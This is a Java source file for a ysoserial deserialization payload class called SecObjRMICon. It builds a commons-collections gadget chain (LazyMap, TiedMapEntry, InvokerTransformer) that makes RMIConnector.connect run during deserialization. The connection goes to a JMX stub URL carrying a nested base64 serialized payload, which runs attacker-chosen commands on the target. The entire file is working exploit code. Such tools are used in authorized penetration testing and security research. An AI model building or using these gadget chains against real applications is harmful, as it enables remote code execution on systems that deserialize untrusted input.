package ysoserial.payloads;

import clojure.lang.Obj;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static ysoserial.payloads.util.Gadgets.createSignedObject;
import static ysoserial.payloads.util.Gadgets.getTargetPayload;
import static ysoserial.payloads.util.Reflections.setFieldValue;

@Dependencies({"commons-collections:commons-collections:3.1"})
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Authors({ Authors.J1an })
public class SecObjRMICon extends PayloadRunner implements ObjectPayload<Object> {


    public Object getObject(final String command) throws Exception {
        byte[] base64data;
        if(command.toLowerCase().startsWith("base64:")){
            base64data=(command.split(":",2)[1]).getBytes();
        }
        else {
            Class payloadClazz = getTargetPayload(command);
            if (payloadClazz == null) {
                throw new IllegalArgumentException("Invalid payload type '" + command.split(":")[0] + "'");
            }
            Method getPayloadObj = payloadClazz.getMethod("getObject", String.class);
            base64data=Base64.encodeBase64((Serializer.serialize(getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":", 2)[1]))));
        }
        String finalStubBase64URL="service:jmx:rmi:///stub/" + new String(base64data);
        JMXServiceURL jmxServiceURL = new JMXServiceURL(finalStubBase64URL);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "J1an");
        lazyMap.remove(rmiConnector);
        setFieldValue(lazyMap,"factory", invokerTransformer);
        return expMap;
    }

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(SecObjRMICon.class, args);
	}
}
